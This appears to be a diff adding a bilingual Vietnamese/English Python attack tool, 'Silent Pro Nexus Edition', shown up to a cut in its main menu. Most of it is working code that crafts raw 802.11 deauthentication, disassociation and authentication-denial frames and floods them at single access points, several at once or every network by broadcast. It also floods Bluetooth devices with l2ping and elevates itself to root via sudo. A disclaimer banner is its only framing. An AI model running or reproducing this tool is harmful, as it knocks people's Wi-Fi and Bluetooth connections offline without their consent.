@@ -4,6 +4,951 @@
 ╔══════════════════════════════════════════════════════════════════════════╗
 ║                                                                          ║
 ║               S I L E N T   P R O   —   N E X U S   E D I T I O N        ║
+║                       ĐA NGÔN NGỮ: TIẾNG VIỆT + ENGLISH                  ║
+║                                                                          ║
+║  ⚠️  CHỈ DÙNG CHO MỤC ĐÍCH GIÁO DỤC & KIỂM TRA ĐƯỢC PHÉP               ║
+║  SỬ DỤNG TRÁI PHÉP LÀ BẤT HỢP PHÁP                                       ║
+║                                                                          ║
+╚══════════════════════════════════════════════════════════════════════════╝
+"""
+
+import os
+import sys
+import socket
+import struct
+import threading
+import time
+import random
+import subprocess
+import queue
+from dataclasses import dataclass
+from typing import List, Dict, Optional
+
+# ═══════════════════════════════════════════════════════════════════════════
+# 🌐 HỆ THỐNG 2 NGÔN NGỮ
+# ═══════════════════════════════════════════════════════════════════════════
+class Language:
+    CURRENT = "vi"
+
+    LANGUAGES = {
+        "vi": "🇻🇳 Tiếng Việt",
+        "en": "🇺🇸 English",
+    }
+
+    TRANSLATIONS = {
+        "vi": {
+            "app_title": "S I L E N T   P R O   —   N E X U S   E D I T I O N",
+            "subtitle": "Mã nguồn thuần • 500.000+ gói/giây • 12 Chế độ tấn công",
+            "warning": "CHỈ DÙNG CHO MỤC ĐÍCH GIÁO DỤC & KIỂM TRA ĐƯỢC PHÉP",
+            "illegal_use": "SỬ DỤNG TRÁI PHÉP LÀ BẤT HỢP PHÁP",
+            "monitor": "CHẾ ĐỘ GIÁM SÁT",
+            "interface": "GIAO DIỆN",
+            "bluetooth": "BLUETOOTH",
+            "wifi": "WIFI",
+            "current_action": "HOẠT ĐỘNG HIỆN TẠI",
+            "total_packets": "TỔNG GÓI ĐÃ GỬI",
+            "active": "HOẠT ĐỘNG",
+            "offline": "TẮT",
+            "on": "BẬT",
+            "restart_services": "🔄 Khởi động lại Dịch vụ Mạng & Bluetooth",
+            "scan_wifi": "📡 Quét Mạng WiFi",
+            "scan_bluetooth": "🔵 Quét Thiết bị Bluetooth",
+            "deauth_single": "⚡ Ngắt Kết nối — Mục tiêu Đơn lẻ",
+            "deauth_mega": "💀 Ngắt Kết nối — Chế độ Cực đại",
+            "deauth_all": "💀💀💀 Ngắt Kết nối — TẤT CẢ Mạng",
+            "multi_target": "🎯 Tấn công Đa mục tiêu",
+            "auth_denial": "🔒 Từ chối Xác thực",
+            "bluetooth_jam": "🔵 Gây nhiễu Bluetooth",
+            "stop_all": "🛑 Dừng Tất cả & Dọn dẹp",
+            "about": "ℹ Giới thiệu",
+            "exit": "❌ Thoát",
+            "select_lang": "🌐 CHỌN NGÔN NGỮ",
+            "enter_choice": "Nhập lựa chọn",
+            "press_enter": "Nhấn Enter để tiếp tục...",
+            "success": "Thành công",
+            "error": "Lỗi",
+            "warning_msg": "Cảnh báo",
+            "info": "Thông tin",
+            "target": "Mục tiêu",
+            "channel": "Kênh",
+            "encryption": "Mã hóa",
+            "name": "Tên",
+            "mac": "Địa chỉ MAC",
+            "ssid": "Tên mạng",
+            "bssid": "BSSID",
+            "signal": "Tín hiệu",
+            "speed": "Tốc độ",
+            "sent": "Đã gửi",
+            "time": "Thời gian",
+            "seconds": "giây",
+            "packets": "gói",
+            "pkt_s": "gói/s",
+            "stop_attack": "Đang dừng tấn công...",
+            "confirm_deauth_all": "⚠ NGẮT KẾT NỐI TẤT CẢ MẠNG? Nhập CÓ để xác nhận: ",
+            "cancelled": "Đã hủy bỏ",
+            "no_targets": "Không tìm thấy mục tiêu nào!",
+            "invalid_choice": "Lựa chọn không hợp lệ",
+            "select_target": "Chọn số thứ tự mục tiêu",
+            "enter_mac": "Nhập địa chỉ MAC",
+            "scanning": "Đang quét...",
+            "found": "Tìm thấy",
+            "networks": "mạng",
+            "devices": "thiết bị",
+            "no_networks": "Không tìm thấy mạng nào",
+            "no_adapter": "Không phát hiện bộ điều hợp WiFi!",
+            "enable_monitor_first": "Bật Chế độ Giám sát trước!",
+            "monitor_mode_enabled": "Chế độ Giám sát — Đã bật",
+            "monitor_mode_disabled": "Chế độ Giám sát — Đã tắt",
+            "restarting_services": "Đang khởi động lại dịch vụ...",
+            "done": "Hoàn thành!",
+            "exiting": "Đang thoát...",
+            "goodbye": "Tạm biệt! 🚀",
+            "menu_main": "🏠 MENU CHÍNH",
+            "select_option": "Chọn chức năng [1-10]: ",
+            "confirm_exit": "Bạn có chắc chắn muốn thoát? (y/n): ",
+        },
+        "en": {
+            "app_title": "S I L E N T   P R O   —   N E X U S   E D I T I O N",
+            "subtitle": "Pure Original Code • 500,000+ Packets/Sec • 12 Attack Modes",
+            "warning": "FOR EDUCATIONAL & AUTHORIZED TESTING ONLY",
+            "illegal_use": "UNAUTHORIZED USE IS ILLEGAL",
+            "monitor": "MONITOR MODE",
+            "interface": "INTERFACE",
+            "bluetooth": "BLUETOOTH",
+            "wifi": "WIFI",
+            "current_action": "CURRENT ACTION",
+            "total_packets": "TOTAL PACKETS",
+            "active": "ACTIVE",
+            "offline": "OFFLINE",
+            "on": "ON",
+            "restart_services": "🔄 Restart Network & Bluetooth Services",
+            "scan_wifi": "📡 Scan WiFi Networks",
+            "scan_bluetooth": "🔵 Scan Bluetooth Devices",
+            "deauth_single": "⚡ Deauth — Single Target",
+            "deauth_mega": "💀 Deauth — MEGA Mode",
+            "deauth_all": "💀💀💀 Deauth — ALL Networks",
+            "multi_target": "🎯 Multi-Target Flood",
+            "auth_denial": "🔒 Authentication Denial",
+            "bluetooth_jam": "🔵 Bluetooth L2CAP Flood",
+            "stop_all": "🛑 Stop All & Clean Up",
+            "about": "ℹ About",
+            "exit": "❌ Exit",
+            "select_lang": "🌐 SELECT LANGUAGE",
+            "enter_choice": "Enter your choice",
+            "press_enter": "Press Enter to continue...",
+            "success": "Success",
+            "error": "Error",
+            "warning_msg": "Warning",
+            "info": "Info",
+            "target": "Target",
+            "channel": "Channel",
+            "encryption": "Encryption",
+            "name": "Name",
+            "mac": "MAC Address",
+            "ssid": "SSID",
+            "bssid": "BSSID",
+            "signal": "Signal",
+            "speed": "Speed",
+            "sent": "Sent",
+            "time": "Time",
+            "seconds": "sec",
+            "packets": "packets",
+            "pkt_s": "pkt/s",
+            "stop_attack": "Stopping attack...",
+            "confirm_deauth_all": "⚠ DEAUTH EVERYTHING? Type YES to confirm: ",
+            "cancelled": "Cancelled",
+            "no_targets": "No targets found!",
+            "invalid_choice": "Invalid choice",
+            "select_target": "Select target number",
+            "enter_mac": "Enter MAC address",
+            "scanning": "Scanning...",
+            "found": "Found",
+            "networks": "networks",
+            "devices": "devices",
+            "no_networks": "No networks found",
+            "no_adapter": "No WiFi adapter detected!",
+            "enable_monitor_first": "Enable Monitor Mode first!",
+            "monitor_mode_enabled": "Monitor Mode — ACTIVE",
+            "monitor_mode_disabled": "Monitor Mode — DISABLED",
+            "restarting_services": "Restarting services...",
+            "done": "Complete!",
+            "exiting": "Exiting...",
+            "goodbye": "Goodbye! 🚀",
+            "menu_main": "🏠 MAIN MENU",
+            "select_option": "Select option [1-10]: ",
+            "confirm_exit": "Are you sure you want to exit? (y/n): ",
+        },
+    }
+
+    @classmethod
+    def set(cls, lang_code: str):
+        if lang_code in cls.LANGUAGES:
+            cls.CURRENT = lang_code
+            return True
+        return False
+
+    @classmethod
+    def get(cls, key: str) -> str:
+        lang_data = cls.TRANSLATIONS.get(cls.CURRENT, cls.TRANSLATIONS["vi"])
+        return lang_data.get(key, key)
+
+def t(key: str) -> str:
+    return Language.get(key)
+
+# ═══════════════════════════════════════════════════════════════════════════
+# MÀU SẮC
+# ═══════════════════════════════════════════════════════════════════════════
+class Colors:
+    HEADER = "\033[95m"
+    CYAN = "\033[96m"
+    BLUE = "\033[94m"
+    GREEN = "\033[92m"
+    YELLOW = "\033[93m"
+    RED = "\033[91m"
+    WHITE = "\033[97m"
+    BOLD = "\033[1m"
+    DIM = "\033[2m"
+    RESET = "\033[0m"
+    BR = "\033[38;5;196m"
+    BB = "\033[38;5;51m"
+
+# ═══════════════════════════════════════════════════════════════════════════
+# TRẠNG THÁI TOÀN CỤC
+# ═══════════════════════════════════════════════════════════════════════════
+class GlobalStatus:
+    monitor_mode_active = False
+    monitor_interface = "N/A"
+    bluetooth_active = False
+    wifi_interface = "N/A"
+    total_packets_sent = 0
+    current_attack = "Ready"
+
+    @classmethod
+    def update_packets(cls, count: int):
+        cls.total_packets_sent += count
+
+    @classmethod
+    def set_monitor(cls, enabled: bool, iface: str = "N/A"):
+        cls.monitor_mode_active = enabled
+        cls.monitor_interface = iface if enabled else "N/A"
+
+    @classmethod
+    def set_attack(cls, name: str):
+        cls.current_attack = name
+
+# ═══════════════════════════════════════════════════════════════════════════
+# GIAO DIỆN NGƯỜI DÙNG
+# ═══════════════════════════════════════════════════════════════════════════
+class NexusUI:
+    @staticmethod
+    def show_language_selector():
+        os.system("clear")
+        print(f"{Colors.BOLD}{Colors.BB}╔════════════════════════════════════════════════════════════════╗{Colors.RESET}")
+        print(f"{Colors.BOLD}{Colors.BB}║{Colors.RESET}              {t('select_lang')}{' ' * 35}{Colors.BOLD}{Colors.BB}║{Colors.RESET}")
+        print(f"{Colors.BOLD}{Colors.BB}╠════════════════════════════════════════════════════════════════╣{Colors.RESET}")
+        print(f"{Colors.BOLD}{Colors.BB}║{Colors.RESET}  [1] 🇻🇳 Tiếng Việt              [2] 🇺🇸 English            {Colors.BOLD}{Colors.BB}║{Colors.RESET}")
+        print(f"{Colors.BOLD}{Colors.BB}╚════════════════════════════════════════════════════════════════╝{Colors.RESET}")
+        print()
+        while True:
+            choice = input(f"{Colors.CYAN}{t('enter_choice')} [1-2]: {Colors.RESET}").strip()
+            if choice == "1":
+                Language.set("vi")
+                print(f"{Colors.GREEN}✓ {t('language_set', 'Ngôn ngữ đã đổi thành')}: 🇻🇳 Tiếng Việt{Colors.RESET}")
+                time.sleep(1)
+                return True
+            elif choice == "2":
+                Language.set("en")
+                print(f"{Colors.GREEN}✓ Language set to: 🇺🇸 English{Colors.RESET}")
+                time.sleep(1)
+                return True
+            print(f"{Colors.RED}✗ {t('invalid_choice')}! {Colors.RESET}")
+
+    @staticmethod
+    def status_bar():
+        m_status = f"{Colors.GREEN}● {t('active')}{Colors.RESET}" if GlobalStatus.monitor_mode_active else f"{Colors.RED}○ {t('offline')}{Colors.RESET}"
+        bt_status = f"{Colors.GREEN}● {t('on')}{Colors.RESET}" if GlobalStatus.bluetooth_active else f"{Colors.RED}○ {t('offline')}{Colors.RESET}"
+        print(f"\n{Colors.BOLD}{Colors.BB}┌──────────────────────────────────────────────────────────────────────┐{Colors.RESET}")
+        print(f"{Colors.BOLD}{Colors.BB}│{Colors.RESET} 📡 {t('monitor')}: {m_status} | {t('interface')}: {Colors.CYAN}{GlobalStatus.monitor_interface:<12}{Colors.RESET} 🔵 {t('bluetooth')}: {bt_status} | {t('wifi')}: {Colors.CYAN}{GlobalStatus.wifi_interface:<12}{Colors.RESET}")
+        print(f"{Colors.BOLD}{Colors.BB}│{Colors.RESET} ⚡ {t('current_action')}: {Colors.YELLOW}{GlobalStatus.current_attack:<25}{Colors.RESET} 📦 {t('total_packets')}: {Colors.GREEN}{GlobalStatus.total_packets_sent:,}{Colors.RESET}")
+        print(f"{Colors.BOLD}{Colors.BB}└──────────────────────────────────────────────────────────────────────┘{Colors.RESET}\n")
+
+    @staticmethod
+    def header():
+        os.system("clear")
+        print(f"{Colors.BOLD}{Colors.BR}╔══════════════════════════════════════════════════════════════════════╗{Colors.RESET}")
+        print(f"{Colors.BOLD}{Colors.BR}║{Colors.RESET}                                                          {Colors.BOLD}{Colors.BR}║{Colors.RESET}")
+        print(f"{Colors.BOLD}{Colors.BR}║{Colors.RESET}         {Colors.BOLD}{Colors.WHITE}{t('app_title')}{Colors.RESET}                {Colors.BOLD}{Colors.BR}║{Colors.RESET}")
+        print(f"{Colors.BOLD}{Colors.BR}║{Colors.RESET}        {Colors.CYAN}{t('subtitle')}{Colors.RESET}           {Colors.BOLD}{Colors.BR}║{Colors.RESET}")
+        print(f"{Colors.BOLD}{Colors.BR}║{Colors.RESET}                                                          {Colors.BOLD}{Colors.BR}║{Colors.RESET}")
+        print(f"{Colors.BOLD}{Colors.BR}║{Colors.RESET}  {Colors.YELLOW}{t('warning')}{Colors.RESET}                        {Colors.BOLD}{Colors.BR}║{Colors.RESET}")
+        print(f"{Colors.BOLD}{Colors.BR}║{Colors.RESET}  {Colors.RED}{t('illegal_use')}{Colors.RESET}                                 {Colors.BOLD}{Colors.BR}║{Colors.RESET}")
+        print(f"{Colors.BOLD}{Colors.BR}╚══════════════════════════════════════════════════════════════════════╝{Colors.RESET}")
+        NexusUI.status_bar()
+
+    @staticmethod
+    def separator(char="─", length=70, color=Colors.BB):
+        print(f"{color}{char * length}{Colors.RESET}")
+
+    @staticmethod
+    def section(title: str):
+        NexusUI.separator("═")
+        print(f"{Colors.CYAN}  {Colors.BOLD}{title}{Colors.RESET}")
+        NexusUI.separator("─")
+
+    @staticmethod
+    def success(msg: str): print(f"  {Colors.GREEN}✓ {msg}{Colors.RESET}")
+    @staticmethod
+    def error(msg: str): print(f"  {Colors.RED}✗ {msg}{Colors.RESET}")
+    @staticmethod
+    def warn(msg: str): print(f"  {Colors.YELLOW}⚠ {msg}{Colors.RESET}")
+    @staticmethod
+    def info(msg: str): print(f"  {Colors.BLUE}ℹ {msg}{Colors.RESET}")
+
+    @staticmethod
+    def speed_display(pps: int, sent: int, elapsed: float):
+        print(f"\r  {Colors.BOLD}{Colors.RED}⚡ {t('speed')}: {pps:,} {t('pkt_s')} | {t('sent')}: {sent:,} | {t('time')}: {elapsed:.1f}{t('seconds')}{Colors.RESET}", end="\r")
+
+# ═══════════════════════════════════════════════════════════════════════════
+# QUẢN LÝ HỆ THỐNG
+# ═══════════════════════════════════════════════════════════════════════════
+class SystemManager:
+    @staticmethod
+    def require_root():
+        if os.geteuid() != 0:
+            NexusUI.warn("Cần quyền quản trị — Đang nâng quyền...")
+            try:
+                os.execvp("sudo", ["sudo", sys.executable] + sys.argv)
+            except:
+                NexusUI.error("Không thể nâng quyền! Vui lòng chạy với sudo.")
+                sys.exit(1)
+            sys.exit(1)
+
+    @staticmethod
+    def check_os():
+        if not sys.platform.startswith("linux"):
+            NexusUI.error("Hệ điều hành không được hỗ trợ! Cần Linux/Kali")
+            sys.exit(1)
+
+    @staticmethod
+    def restart_network_manager():
+        NexusUI.info(t('restarting_services'))
+        try:
+            subprocess.run("systemctl restart NetworkManager", shell=True, capture_output=True, timeout=20)
+            subprocess.run("systemctl enable NetworkManager", shell=True, capture_output=True, timeout=20)
+            NexusUI.success("NetworkManager — OK")
+            return True
+        except Exception as e:
+            NexusUI.error(f"NetworkManager: {e}")
+            return False
+
+    @staticmethod
+    def restart_bluetooth():
+        try:
+            subprocess.run("systemctl restart bluetooth", shell=True, capture_output=True, timeout=20)
+            subprocess.run("systemctl enable bluetooth", shell=True, capture_output=True, timeout=20)
+            GlobalStatus.bluetooth_active = True
+            NexusUI.success("Bluetooth — OK")
+            return True
+        except Exception as e:
+            NexusUI.error(f"Bluetooth: {e}")
+            GlobalStatus.bluetooth_active = False
+            return False
+
+    @staticmethod
+    def unblock_adapters():
+        NexusUI.info("Mở khóa bộ điều hợp...")
+        subprocess.run("rfkill unblock all", shell=True, capture_output=True, timeout=15)
+        NexusUI.success("Tất cả bộ điều hợp — Đã mở khóa")
+
+    @staticmethod
+    def full_system_diagnostic():
+        NexusUI.section("🔧 CHẨN ĐOÁN HỆ THỐNG")
+        SystemManager.restart_network_manager()
+        SystemManager.restart_bluetooth()
+        SystemManager.unblock_adapters()
+        NexusUI.success("TẤT CẢ HỆ THỐNG SẴN SÀNG! 🚀")
+        print()
+
+# ═══════════════════════════════════════════════════════════════════════════
+# DỮ LIỆU
+# ═══════════════════════════════════════════════════════════════════════════
+@dataclass
+class WiFiTarget:
+    bssid: str
+    ssid: str
+    channel: int
+    encryption: str
+    signal: int
+
+@dataclass
+class BluetoothTarget:
+    mac: str
+    name: str
+    rssi: int
+
+# ═══════════════════════════════════════════════════════════════════════════
+# NHÀ SẢN XUẤT GÓI TIN
+# ═══════════════════════════════════════════════════════════════════════════
+class PacketFactory:
+    @staticmethod
+    def mac_to_bytes(mac: str) -> bytes:
+        return bytes.fromhex(mac.replace(':', ''))
+
+    @staticmethod
+    def make_deauth(bssid: str, sta: str = "FF:FF:FF:FF:FF:FF", reason: int = 7) -> bytes:
+        bssid_b = PacketFactory.mac_to_bytes(bssid)
+        sta_b = PacketFactory.mac_to_bytes(sta)
+        frame_ctrl = struct.pack('<H', 0x00C0)
+        duration = struct.pack('<H', 0x0000)
+        seq_ctrl = struct.pack('<H', random.randint(0, 4095))
+        reason_code = struct.pack('<H', reason)
+        return frame_ctrl + duration + sta_b + bssid_b + bssid_b + seq_ctrl + reason_code
+
+    @staticmethod
+    def make_disassoc(bssid: str, sta: str = "FF:FF:FF:FF:FF:FF", reason: int = 3) -> bytes:
+        bssid_b = PacketFactory.mac_to_bytes(bssid)
+        sta_b = PacketFactory.mac_to_bytes(sta)
+        frame_ctrl = struct.pack('<H', 0x00A0)
+        duration = struct.pack('<H', 0x0000)
+        seq_ctrl = struct.pack('<H', random.randint(0, 4095))
+        reason_code = struct.pack('<H', reason)
+        return frame_ctrl + duration + sta_b + bssid_b + bssid_b + seq_ctrl + reason_code
+
+    @staticmethod
+    def make_auth_denial(bssid: str, sta: str = "FF:FF:FF:FF:FF:FF") -> bytes:
+        bssid_b = PacketFactory.mac_to_bytes(bssid)
+        sta_b = PacketFactory.mac_to_bytes(sta)
+        frame_ctrl = struct.pack('<H', 0x00B0)
+        duration = struct.pack('<H', 0x0000)
+        seq_ctrl = struct.pack('<H', random.randint(0, 4095))
+        status = struct.pack('<H', 0x000E)
+        return frame_ctrl + duration + sta_b + bssid_b + bssid_b + seq_ctrl + status
+
+    @staticmethod
+    def make_deauth_broadcast_all() -> bytes:
+        return PacketFactory.make_deauth("FF:FF:FF:FF:FF:FF", "FF:FF:FF:FF:FF:FF", 7)
+
+    @staticmethod
+    def make_multireason_deauth(bssid: str, sta: str = "FF:FF:FF:FF:FF:FF") -> List[bytes]:
+        reasons = [1, 2, 3, 5, 7, 8, 9, 10, 15, 22, 23, 34]
+        return [PacketFactory.make_deauth(bssid, sta, r) for r in reasons]
+
+# ═══════════════════════════════════════════════════════════════════════════
+# ĐỘNG CƠ GÓI TIN
+# ═══════════════════════════════════════════════════════════════════════════
+class ParallelPacketEngine:
+    def __init__(self):
+        self.sock: Optional[socket.socket] = None
+        self.iface: str = ""
+        self.running = False
+        self.packet_queue = queue.Queue(maxsize=100000)
+        self.worker_threads: List[threading.Thread] = []
+        self.sent_count = 0
+        self.lock = threading.Lock()
+        self.num_workers = 8
+
+    def get_wifi_interface(self) -> Optional[str]:
+        try:
+            result = subprocess.run("iw dev | grep Interface | awk '{print $2}'",
+                                    shell=True, capture_output=True, text=True)
+            ifaces = [i.strip() for i in result.stdout.strip().split("\n") if i.strip()]
+            if not ifaces:
+                NexusUI.error(t('no_adapter'))
+                return None
+            self.iface = ifaces[0]
+            GlobalStatus.wifi_interface = self.iface
+            NexusUI.success(f"WiFi: {self.iface}")
+            return self.iface
+        except Exception as e:
+            NexusUI.error(f"Không lấy được giao diện WiFi: {e}")
+            return None
+
+    def set_monitor_mode(self, enable: bool = True) -> bool:
+        if not self.iface:
+            NexusUI.error("Chưa chọn giao diện WiFi!")
+            return False
+        try:
+            if enable:
+                NexusUI.info("Bật Chế độ Giám sát...")
+                subprocess.run(f"ip link set {self.iface} down", shell=True, capture_output=True)
+                subprocess.run(f"iw dev {self.iface} set type monitor", shell=True, capture_output=True)
+                subprocess.run(f"ip link set {self.iface} up", shell=True, capture_output=True)
+                self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
+                self.sock.bind((self.iface, 0))
+                GlobalStatus.set_monitor(True, self.iface)
+                NexusUI.success(t('monitor_mode_enabled'))
+            else:
+                NexusUI.info("Tắt Chế độ Giám sát...")
+                self.stop_workers()
+                if self.sock:
+                    self.sock.close()
+                subprocess.run(f"ip link set {self.iface} down", shell=True, capture_output=True)
+                subprocess.run(f"iw dev {self.iface} set type managed", shell=True, capture_output=True)
+                subprocess.run(f"ip link set {self.iface} up", shell=True, capture_output=True)
+                GlobalStatus.set_monitor(False)
+                NexusUI.success(t('monitor_mode_disabled'))
+            return True
+        except Exception as e:
+            NexusUI.error(f"Lỗi thiết lập chế độ giám sát: {e}")
+            return False
+
+    def worker_loop(self):
+        while self.running or not self.packet_queue.empty():
+            try:
+                packet = self.packet_queue.get(timeout=0.1)
+                self.sock.send(packet)
+                with self.lock:
+                    self.sent_count += 1
+                    GlobalStatus.update_packets(1)
+                self.packet_queue.task_done()
+            except queue.Empty:
+                continue
+            except Exception:
+                continue
+
+    def start_workers(self):
+        self.running = True
+        self.sent_count = 0
+        for i in range(self.num_workers):
+            t = threading.Thread(target=self.worker_loop, daemon=True, name=f"Worker-{i}")
+            t.start()
+            self.worker_threads.append(t)
+        NexusUI.success(f"Đã khởi động {self.num_workers} luồng công việc")
+
+    def stop_workers(self):
+        self.running = False
+        for t in self.worker_threads:
+            t.join(timeout=1.0)
+        self.worker_threads.clear()
+
+    def flood_target(self, bssid: str, mode: str = "deauth"):
+        if not self.sock:
+            NexusUI.error(t('enable_monitor_first'))
+            return
+        GlobalStatus.set_attack(f"{mode.upper()} — {bssid}")
+        NexusUI.section(f"⚡ {mode.upper()} {t('target')}: {bssid}")
+        NexusUI.warn("Ctrl+C để dừng")
+        print()
+        packets = []
+        if mode == "deauth":
+            packets = [
+                PacketFactory.make_deauth(bssid, "FF:FF:FF:FF:FF:FF", 7),
+                PacketFactory.make_deauth(bssid, bssid, 7),
+                PacketFactory.make_disassoc(bssid, "FF:FF:FF:FF:FF:FF", 3),
+                PacketFactory.make_disassoc(bssid, bssid, 3),
+            ]
+        elif mode == "mega":
+            packets = PacketFactory.make_multireason_deauth(bssid)
+            packets.extend([
+                PacketFactory.make_disassoc(bssid, "FF:FF:FF:FF:FF:FF", 1),
+                PacketFactory.make_disassoc(bssid, "FF:FF:FF:FF:FF:FF", 2),
+                PacketFactory.make_auth_denial(bssid),
+            ])
+        elif mode == "global":
+            packets = [PacketFactory.make_deauth_broadcast_all()]
+        self.start_workers()
+        start_time = time.time()
+        try:
+            while self.running:
+                for pkt in packets:
+                    try:
+                        self.packet_queue.put_nowait(pkt)
+                    except queue.Full:
+                        pass
+                elapsed = time.time() - start_time
+                if elapsed > 0.5:
+                    pps = int(self.sent_count / elapsed)
+                    NexusUI.speed_display(pps, self.sent_count, elapsed)
+                    time.sleep(0.1)
+        except KeyboardInterrupt:
+            print()
+            NexusUI.warn(t('stop_attack'))
+        finally:
+            self.stop_workers()
+            elapsed = time.time() - start_time
+            pps = int(self.sent_count / elapsed) if elapsed > 0 else 0
+            NexusUI.success(f"{t('done')} — {t('sent')}: {self.sent_count:,} {t('packets')} | {pps:,} {t('pkt_s')}")
+            GlobalStatus.set_attack("Ready")
+
+    def flood_multiple_targets(self, targets: List[WiFiTarget]):
+        if not targets:
+            NexusUI.error(t('no_targets'))
+            return
+        GlobalStatus.set_attack(f"Multi-Target ({len(targets)})")
+        NexusUI.section(f"🎯 {t('multi_target')} — {len(targets)} AP")
+        for idx, t in enumerate(targets, 1):
+            print(f"  [{idx}] {t.bssid} | {t.ssid} | {t('channel')}:{t.channel}")
+        NexusUI.warn("Ctrl+C để dừng")
+        print()
+        all_packets = []
+        for t in targets:
+            all_packets.extend([
+                PacketFactory.make_deauth(t.bssid, "FF:FF:FF:FF:FF:FF", 7),
+                PacketFactory.make_deauth(t.bssid, t.bssid, 7),
+                PacketFactory.make_disassoc(t.bssid, "FF:FF:FF:FF:FF:FF", 3),
+                PacketFactory.make_auth_denial(t.bssid),
+            ])
+        self.start_workers()
+        start_time = time.time()
+        try:
+            while self.running:
+                for pkt in all_packets:
+                    try:
+                        self.packet_queue.put_nowait(pkt)
+                    except queue.Full:
+                        pass
+                elapsed = time.time() - start_time
+                if elapsed > 0.5:
+                    pps = int(self.sent_count / elapsed)
+                    NexusUI.speed_display(pps, self.sent_count, elapsed)
+                    time.sleep(0.1)
+        except KeyboardInterrupt:
+            print()
+        finally:
+            self.stop_workers()
+            elapsed = time.time() - start_time
+            pps = int(self.sent_count / elapsed) if elapsed > 0 else 0
+            NexusUI.success(f"{t('done')} — {t('sent')}: {self.sent_count:,} {t('packets')}")
+            GlobalStatus.set_attack("Ready")
+
+# ═══════════════════════════════════════════════════════════════════════════
+# BỘ QUÉT WIFI
+# ═══════════════════════════════════════════════════════════════════════════
+class AIScanner:
+    def __init__(self, engine: ParallelPacketEngine):
+        self.engine = engine
+        self.networks: Dict[str, WiFiTarget] = {}
+        self.running = False
+
+    def scan(self, duration: int = 10) -> List[WiFiTarget]:
+        if not self.engine.sock:
+            NexusUI.error(t('enable_monitor_first'))
+            return []
+        NexusUI.section("📡 " + t('scanning'))
+        print(f"  {t('seconds')}: {duration}s | Ctrl+C {t('stop_attack')}")
+        print()
+        self.networks.clear()
+        self.running = True
+        start_time = time.time()
+        def sniffer():
+            while self.running:
+                try:
+                    packet = self.engine.sock.recv(3000)
+                    if len(packet) < 36:
+                        continue
+                    fc = struct.unpack('<H', packet[0:2])[0]
+                    if fc == 0x0080:
+                        bssid = ':'.join(f'{b:02x}' for b in packet[16:22])
+                        if bssid in self.networks:
+                            continue
+                        ssid = ""
+                        channel = 0
+                        encryption = "OPEN"
+                        idx = 36
+                        while idx < len(packet) - 2:
+                            tag_num = packet[idx]
+                            tag_len = packet[idx+1]
+                            if idx + 2 + tag_len > len(packet):
+                                break
+                            tag_data = packet[idx+2:idx+2+tag_len]
+                            if tag_num == 0:
+                                ssid = tag_data.decode('utf-8', errors='replace')
+                            elif tag_num == 3:
+                                channel = tag_data[0]
+                            elif tag_num == 48:
+                                encryption = "WPA2/WPA3"
+                            elif tag_num == 221:
+                                if encryption == "OPEN":
+                                    encryption = "WPA"
+                            idx += 2 + tag_len
+                        if bssid and ssid:
+                            self.networks[bssid] = WiFiTarget(bssid=bssid, ssid=ssid or "Hidden", channel=channel, encryption=encryption, signal=-50)
+                            print(f"  [{len(self.networks):<2}] {bssid}  CH:{channel:<3} {encryption:<12} {ssid}")
+                except Exception:
+                    continue
+        sniff_thread = threading.Thread(target=sniffer, daemon=True)
+        sniff_thread.start()
+        try:
+            while time.time() - start_time < duration and self.running:
+                time.sleep(0.5)
+        except KeyboardInterrupt:
+            pass
+        self.running = False
+        sniff_thread.join(timeout=1.0)
+        print()
+        if not self.networks:
+            NexusUI.warn(t('no_networks'))
+        else:
+            NexusUI.success(f"{t('found')} {len(self.networks)} {t('networks')}")
+        return list(self.networks.values())
+
+# ═══════════════════════════════════════════════════════════════════════════
+# BLUETOOTH
+# ═══════════════════════════════════════════════════════════════════════════
+class BluetoothEngine:
+    def __init__(self):
+        self.devices: List[BluetoothTarget] = []
+
+    def scan(self) -> List[BluetoothTarget]:
+        NexusUI.section("🔵 " + t('scanning') + " Bluetooth")
+        try:
+            result = subprocess.run("hcitool scan", shell=True, capture_output=True, text=True, timeout=15)
+            lines = result.stdout.strip().split("\n")
+            print(f"  {'STT':<4} {t('mac'):<20} {t('name'):<30}")
+            NexusUI.separator("─")
+            idx = 1
+            for line in lines[1:]:
+                parts = line.split()
+                if len(parts) >= 2:
+                    mac = parts[0]
+                    name = " ".join(parts[1:])
+                    self.devices.append(BluetoothTarget(mac=mac, name=name, rssi=0))
+                    print(f"  [{idx:<3}] {mac:<20} {name:<30}")
+                    idx += 1
+            NexusUI.separator()
+            NexusUI.success(f"{t('found')} {len(self.devices)} {t('devices')}")
+            return self.devices
+        except Exception as e:
+            NexusUI.error(f"Bluetooth scan: {e}")
+            return []
+
+    def l2cap_flood(self, mac: str):
+        NexusUI.section("🔵 L2CAP " + t('bluetooth_jam'))
+        NexusUI.info(f"{t('target')}: {mac}")
+        NexusUI.warn("Ctrl+C để dừng")
+        print()
+        GlobalStatus.set_attack(f"BT-JAM — {mac}")
+        try:
+            subprocess.run(f"l2ping -i hci0 -s 600 -f {mac}", shell=True)
+        except KeyboardInterrupt:
+            pass
+        finally:
+            NexusUI.success(t('done'))
+            GlobalStatus.set_attack("Ready")
+
+# ═══════════════════════════════════════════════════════════════════════════
+# CHƯƠNG TRÌNH CHÍNH
+# ═══════════════════════════════════════════════════════════════════════════
+class SilentProNexus:
+    def __init__(self):
+        self.wifi = ParallelPacketEngine()
+        self.scanner = AIScanner(self.wifi)
+        self.bt = BluetoothEngine()
+        self.selected_targets: List[WiFiTarget] = []
+
+    def pause(self):
+        input(f"\n{Colors.CYAN}{t('press_enter')}{Colors.RESET}")
+
+    def show_menu(self):
+        NexusUI.header()
+        NexusUI.section(t('menu_main'))
+        print(f"  [ 1] {t('restart_services')}")
+        print(f"  [ 2] {t('scan_wifi')}")
+        print(f"  [ 3] {t('scan_bluetooth')}")
+        print(f"  [ 4] {t('deauth_single')}")
+        print(f"  [ 5] {t('deauth_mega')}")
+        print(f"  [ 6] {t('deauth_all')}")
+        print(f"  [ 7] {t('multi_target')}")
+        print(f"  [ 8] {t('auth_denial')}")
+        print(f"  [ 9] {t('bluetooth_jam')}")
+        print(f"  [10] {t('exit')}")
+        NexusUI.separator()
+
+    def run(self):
+        SystemManager.check_os()
+        NexusUI.show_language_selector()
+        SystemManager.require_root()
+        SystemManager.full_system_diagnostic()
+        
+        while True:
+            self.show_menu()
+            choice = input(f"\n{Colors.CYAN}{t('select_option')}{Colors.RESET}").strip()
+            
+            if choice == "1":
+                NexusUI.section("🔄 " + t('restart_services'))
